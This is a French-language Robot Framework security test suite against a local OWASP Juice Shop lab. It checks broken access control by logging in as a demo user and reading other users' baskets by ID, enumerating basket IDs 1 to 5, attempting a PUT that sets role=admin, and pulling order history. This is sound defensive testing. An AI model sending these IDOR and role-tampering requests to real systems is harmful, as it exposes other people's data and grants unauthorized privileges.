*** Settings ***
Documentation     Sécurité IAM avancée : IDOR et Privilege Escalation (OWASP A01 - Broken Access Control)
...               Cible : OWASP Juice Shop (localhost:3000)
Library           RequestsLibrary
Library           Collections

*** Variables ***
${BASE_URL}           http://localhost:3000
${LOGIN_ENDPOINT}     /rest/user/login
${BASKET_ENDPOINT}    /rest/basket
${USER_ENDPOINT}      /api/Users

# Compte "attaquant" (utilisateur normal)
${ATTACKER_EMAIL}     jim@juice-sh.op
${ATTACKER_PASSWORD}    ncc-1701

# Compte "victime" (autre utilisateur normal) - juste besoin de connaitre/deviner son ID
${VICTIM_BASKET_ID}    1

*** Test Cases ***
Verifier Identite Reelle De Lattaquant
    [Documentation]    Récupère l'ID réel de jim pour confirmer que le panier testé n'est pas le sien
    Create Session    whoami    ${BASE_URL}
    ${body}=    Create Dictionary    email=${ATTACKER_EMAIL}    password=${ATTACKER_PASSWORD}
    ${login_response}=    POST On Session    whoami    ${LOGIN_ENDPOINT}    json=${body}
    ${token}=    Set Variable    ${login_response.json()['authentication']['token']}
    ${headers}=    Create Dictionary    Authorization=Bearer ${token}

    ${response}=    GET On Session    whoami    /rest/user/whoami
    ...    headers=${headers}    expected_status=any

    Log    IDENTITE REELLE DE JIM: ${response.text}    level=WARN

IDOR Sur Le Panier Dun Autre Utilisateur
    [Documentation]    Vérifie si un utilisateur peut voir le panier d'un autre user en changeant l'ID
    Create Session    attacker    ${BASE_URL}
    ${body}=    Create Dictionary    email=${ATTACKER_EMAIL}    password=${ATTACKER_PASSWORD}
    ${login_response}=    POST On Session    attacker    ${LOGIN_ENDPOINT}    json=${body}

    Should Be Equal As Strings    ${login_response.status_code}    200
    ${token}=    Set Variable    ${login_response.json()['authentication']['token']}
    ${headers}=    Create Dictionary    Authorization=Bearer ${token}

    # Tentative d'accès au panier avec un ID différent du sien (ex: panier ID 1, 2, 3...)
    ${response}=    GET On Session    attacker    ${BASKET_ENDPOINT}/${VICTIM_BASKET_ID}
    ...    headers=${headers}    expected_status=any

    Log    Statut reçu pour accès panier ID ${VICTIM_BASKET_ID}: ${response.status_code}

    IF    ${response.status_code} == 200
        Log    FAILLE CONFIRMEE: IDOR - accès possible au panier d'un autre utilisateur (code 200)    level=WARN
        Log    Contenu exposé: ${response.text}    level=WARN
    ELSE
        Log    OK: accès refusé au panier d'un autre utilisateur (code ${response.status_code})
    END

IDOR Sur Plusieurs Paniers Consecutifs
    [Documentation]    Teste les paniers ID 1 à 5 pour confirmer que l'accès non autorisé n'est pas un cas isolé
    Create Session    attacker_multi    ${BASE_URL}
    ${body}=    Create Dictionary    email=${ATTACKER_EMAIL}    password=${ATTACKER_PASSWORD}
    ${login_response}=    POST On Session    attacker_multi    ${LOGIN_ENDPOINT}    json=${body}
    ${token}=    Set Variable    ${login_response.json()['authentication']['token']}
    ${headers}=    Create Dictionary    Authorization=Bearer ${token}

    FOR    ${basket_id}    IN RANGE    1    6
        ${response}=    GET On Session    attacker_multi    ${BASKET_ENDPOINT}/${basket_id}
        ...    headers=${headers}    expected_status=any
        IF    ${response.status_code} == 200
            ${user_id}=    Set Variable    ${response.json()['data']['UserId']}
            Log    FAILLE: panier ID ${basket_id} accessible - appartient à UserId ${user_id}    level=WARN
        ELSE
            Log    OK: panier ID ${basket_id} refusé (code ${response.status_code})
        END
    END

Privilege Escalation Via Modification Du Role Utilisateur
    [Documentation]    Vérifie si un utilisateur standard peut s'auto-promouvoir admin via l'API
    Create Session    attacker2    ${BASE_URL}
    ${body}=    Create Dictionary    email=${ATTACKER_EMAIL}    password=${ATTACKER_PASSWORD}
    ${login_response}=    POST On Session    attacker2    ${LOGIN_ENDPOINT}    json=${body}

    Should Be Equal As Strings    ${login_response.status_code}    200
    ${token}=    Set Variable    ${login_response.json()['authentication']['token']}
    ${user_id}=    Set Variable    ${login_response.json()['authentication']['umail']}
    ${headers}=    Create Dictionary    Authorization=Bearer ${token}    Content-Type=application/json

    # Tentative de modification du rôle vers "admin" via l'API user
    ${payload}=    Create Dictionary    role=admin
    ${response}=    PUT On Session    attacker2    ${USER_ENDPOINT}/1
    ...    headers=${headers}    json=${payload}    expected_status=any

    Log    Statut reçu pour tentative de changement de rôle: ${response.status_code}

    IF    ${response.status_code} == 200
        Log    FAILLE CRITIQUE: privilege escalation possible via modification directe du role    level=WARN
    ELSE
        Log    OK: modification de rôle refusée (code ${response.status_code})
    END

Acces A La Liste Complete Des Commandes Sans Filtrage Par Utilisateur
    [Documentation]    Vérifie si l'endpoint des commandes retourne les commandes de TOUS les users (pas juste les siennes)
    Create Session    attacker3    ${BASE_URL}
    ${body}=    Create Dictionary    email=${ATTACKER_EMAIL}    password=${ATTACKER_PASSWORD}
    ${login_response}=    POST On Session    attacker3    ${LOGIN_ENDPOINT}    json=${body}

    Should Be Equal As Strings    ${login_response.status_code}    200
    ${token}=    Set Variable    ${login_response.json()['authentication']['token']}
    ${headers}=    Create Dictionary    Authorization=Bearer ${token}

    ${response}=    GET On Session    attacker3    /rest/basket/1/order-history
    ...    headers=${headers}    expected_status=any

    Log    Statut reçu: ${response.status_code}
    Log    Réponse: ${response.text}

    IF    ${response.status_code} == 200
        Log    A VERIFIER MANUELLEMENT: comparer si des commandes d'autres users apparaissent    level=WARN
    END